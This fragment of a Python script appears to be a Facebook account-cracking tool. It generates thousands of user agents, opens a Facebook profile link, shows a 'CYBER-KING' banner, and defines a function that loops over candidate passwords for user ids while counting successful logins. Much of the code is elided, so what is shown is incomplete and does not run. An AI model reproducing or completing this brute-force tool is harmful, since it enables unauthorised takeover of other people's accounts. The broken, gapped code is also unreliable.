...
for ua in range(5000):
	...
	ugen.append(alhaj)
os.system("xdg-open https://www.facebook.com/profile.php?id=100095296442670/")
# LOGO
logo = ("""
\033[1;31m███╗   ███╗██████╗      █████╗ ██╗     ██╗  ██╗ █████╗      ██╗
\033[1;32m████╗ ████║██╔══██╗    ██╔══██╗██║     ██║  ██║██╔══██╗     ██║
...
def alhaj(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write('\r\033[1;32m[CYBER-KING]\033[1;36m😍[%s/%s]😁\033[1;32m[OK-%s]\033[1;35m \r'%(loop,tl,len(oks))),
            sys.stdout.flush()
